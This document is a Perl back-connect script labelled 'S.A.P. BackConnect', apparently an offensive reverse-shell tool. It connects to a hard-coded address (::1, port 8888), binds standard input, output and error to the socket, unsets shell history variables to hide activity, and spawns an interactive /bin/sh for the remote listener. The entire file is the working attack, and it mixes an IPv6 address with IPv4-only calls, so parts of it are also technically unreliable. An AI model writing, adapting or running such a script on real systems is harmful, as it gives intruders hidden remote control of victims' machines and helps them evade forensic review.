#!/usr/bin/perl
$SIG{'CHLD'}='IGNORE';
use IO::Socket;
use FileHandle;
$o=" [OK]";
$e="      Error: ";
$l="\r\n-----------------------------------------\r\n";
$h="----  Hello from S.A.P. BackConnect  ----";
print $h;
print "\r\n> Start...";
print "\r\n> Get protocol by name...";
$tcp=getprotobyname("tcp") or die print "$l$e$!$l";
print "           $o";
print "\r\n> Convert host address...";
$inet=inet_aton("::1") or die print "$l$e$!$l";
print "           $o";
print "\r\n> Packed address info...";
$sckt=sockaddr_in(8888,$inet) or die print "$l$e$!$l"; 
print "            $o"; 
print "\r\n> Create socket..."; 
socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print "$l$e$!$l"; 
print "                  $o"; 
print "\r\n> Connect to ::1:8888..."; 
connect(SOCKET,$sckt) or die print "$l$e$!$l"; 
print "$l      OK! I'm successful connected.$l"; 
open(STDIN, "<&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("unset HISTFILE; unset SAVEHIST;");
print "\r\n$h\r\n\r\n";
system('/bin/sh -i');
print "$l\r\n"; 
